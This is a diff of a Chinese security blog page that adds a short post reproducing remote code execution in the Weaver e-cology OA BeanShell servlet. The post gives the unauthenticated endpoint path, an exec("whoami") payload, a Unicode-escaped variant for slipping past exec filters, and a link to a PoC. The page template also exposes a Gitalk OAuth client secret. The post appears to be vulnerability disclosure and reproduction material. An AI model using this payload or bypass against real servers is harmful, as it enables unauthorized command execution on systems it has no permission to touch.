@@ -40,30 +40,23 @@
       
         <div class="animated fadeInLeft" style="animation-delay: 0.4s">
           <p class="my-4 text-gray-600 font-light hidden lg:block">
-            不在平静中灭亡~
+            文章目录
           </p>
-          <div class="animated fadeInLeft social-container hidden lg:block" style="animation-delay: 0.6s">
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x01-%E8%AE%BF%E9%97%AE%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2">0x01 访问未授权访问页面</a></li>
+<li><a href="#0x02-%E8%BE%93%E5%85%A5payload">0x02 输入payload</a></li>
+<li><a href="#0x03-%E5%B0%86exec%E8%BF%9B%E8%A1%8Cunicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E7%AB%99%E7%82%B9exec%E8%BF%87%E6%BB%A4">0x03 将exec进行Unicode编码绕过部分站点exec过滤</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
           </div>
         </div>
       
@@ -107,33 +100,76 @@
 </div>
 <div class="mask" onclick="closeMenu()">
 </div>
-      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4">
-        <h2 class="text-lg text-gray-700 mb-8">
-          <i class="remixicon-bookmark-2-line"></i> 标签云
-        </h2>
-        <div class="tags-container">
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">泛微e-cology OA Beanshell组件远程代码执行(复现及POC)</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2019-09-23 / 1 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="http://www.svenbeast.com//post-images/9rcdl83tA.png" alt="">
+        
+        <div class="post-content yue">
+          <h3 id="0x01-访问未授权访问页面">0x01 访问未授权访问页面</h3>
+<p>http://oa.xxxx.com/weaver/bsh.servlet.BshServlet<br>
+<img src="http://www.svenbeast.com//post-images/1569211550430.jpg" alt=""></p>
+<h3 id="0x02-输入payload">0x02 输入payload</h3>
+<p>exec(&quot;whoami&quot;);<br>
+输入命令执行函数，传入cmd命令，查看回显是否成功执行<br>
+<img src="http://www.svenbeast.com//post-images/1569211623826.png" alt=""></p>
+<h3 id="0x03-将exec进行unicode编码绕过部分站点exec过滤">0x03 将exec进行Unicode编码绕过部分站点exec过滤</h3>
+<p>\u0065\u0078\u0065\u0063(&quot;whoami&quot;);<br>
+<img src="http://www.svenbeast.com//post-images/1569211999619.png" alt=""></p>
+<p>PS：https://github.com/jas502n/e-cology<br>
+少宇师傅的POC地址，后期批量有时间就写，现在70周年国庆节，有点忙。</p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
           
-            <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/wjQYmk5ed" :style="{ 'animation-delay': `${0 * 0.2}s` }">
-              <span class="flex-auto">Discuz!ML</span>
-              <span class="flex rounded-full bg-gray-200 px-2 py-1 text-xs ml-1">1</span>
-            </a>
+
           
-            <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/_fczXccA_" :style="{ 'animation-delay': `${1 * 0.2}s` }">
-              <span class="flex-auto">poc</span>
-              <span class="flex rounded-full bg-gray-200 px-2 py-1 text-xs ml-1">2</span>
-            </a>
-          
-            <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/De8Gb6fGa" :style="{ 'animation-delay': `${2 * 0.2}s` }">
-              <span class="flex-auto">致远</span>
-              <span class="flex rounded-full bg-gray-200 px-2 py-1 text-xs ml-1">1</span>
-            </a>
-          
-            <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/DtgB1KMTP" :style="{ 'animation-delay': `${3 * 0.2}s` }">
-              <span class="flex-auto">文件包含</span>
-              <span class="flex rounded-full bg-gray-200 px-2 py-1 text-xs ml-1">1</span>
-            </a>
+            <div class="next-post">
+              <a href="http://www.svenbeast.com//post/fkOpKjach">
+                <h3 class="post-title">
+                  Shiro&lt;=1.2.4反序列化的简单理解及POC
+                  <i class="remixicon-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
           
         </div>
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'e2161286d5700e89fddf',
+    clientSecret: '9481468e5e7f8944f425f70a0a51eddfaebbe8d2',
+    repo: 'menghao56392.github.io',
+    owner: 'menghao56392',
+    admin: ['menghao56392'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
       </div>
     </div>
 
